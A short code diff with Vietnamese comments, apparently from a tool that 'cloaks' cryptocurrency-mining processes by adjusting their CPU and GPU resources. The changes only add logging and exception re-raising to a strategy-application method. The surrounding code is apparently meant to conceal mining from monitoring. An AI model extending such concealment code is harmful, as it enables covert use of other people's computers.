@@ -175,6 +175,8 @@ class SharedResourceManager:
         except Exception as e:
             self.logger.error(f"Lỗi khi điều chỉnh tần số CPU dựa trên tải cho tiến trình {process.name} (PID: {process.pid}): {e}")
 
+
+
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         """
         Áp dụng một chiến lược cloaking cụ thể cho tiến trình và lưu trạng thái tài nguyên ban đầu.
@@ -183,7 +185,13 @@ class SharedResourceManager:
             strategy_name (str): Tên chiến lược cloaking.
             process (MiningProcess): Tiến trình cần áp dụng cloaking.
         """
-        strategy = CloakStrategyFactory.create_strategy(strategy_name, self.config, self.logger, self.is_gpu_initialized())
+        try:
+            self.logger.debug(f"Đang tạo chiến lược {strategy_name} cho tiến trình {process.name} (PID: {process.pid})")
+            strategy = CloakStrategyFactory.create_strategy(strategy_name, self.config, self.logger, self.is_gpu_initialized())
+        except Exception as e:
+            self.logger.error(f"Không thể tạo chiến lược {strategy_name}: {e}")
+            raise  # Đảm bảo ngoại lệ được ném ra ngoài
+
         if strategy:
             try:
                 adjustments = strategy.apply(process)
@@ -220,8 +228,11 @@ class SharedResourceManager:
                     self.logger.warning(f"Không có điều chỉnh nào được áp dụng cho chiến lược {strategy_name} cho tiến trình {process.name} (PID: {process.pid}).")
             except Exception as e:
                 self.logger.error(f"Lỗi khi áp dụng chiến lược cloaking {strategy_name} cho tiến trình {process.name} (PID: {process.pid}): {e}")
+                raise  # Đảm bảo ném ngoại lệ nếu gặp lỗi trong quá trình áp dụng
         else:
-            self.logger.warning(f"Chiến lược cloaking {strategy_name} không được tạo thành công cho tiến trình {process.name} (PID: {process.pid}).")
+            warning_message = f"Chiến lược cloaking {strategy_name} không được tạo thành công cho tiến trình {process.name} (PID: {process.pid})."
+            self.logger.warning(warning_message)
+            raise RuntimeError(warning_message)  # Đảm bảo lỗi được ném ra nếu chiến lược không được tạo
 
     def restore_resources(self, process: MiningProcess):
         """
